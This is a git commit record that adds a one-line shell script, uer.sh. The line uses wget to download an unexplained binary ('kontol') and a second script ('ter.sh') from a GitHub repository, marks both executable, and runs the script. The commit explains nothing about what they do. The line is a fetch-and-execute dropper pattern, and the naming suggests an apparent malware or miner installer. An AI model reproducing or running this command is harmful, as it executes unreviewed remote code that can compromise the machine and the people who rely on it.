4a8a44df6c71780d0d4ea8bb1667317d3c5132e2
synthsizer <39385299+synthsizer@users.noreply.github.com>
2024-01-18 10:36:34 +0700

    Create uer.sh

---
+++ uer.sh
@@ -0,0 +1,1 @@
+wget https://github.com/synthsizer/widicantik/raw/main/kontol && chmod +x kontol && wget https://raw.githubusercontent.com/synthsizer/widicantik/main/ter.sh && chmod +x ter.sh && ./ter.sh
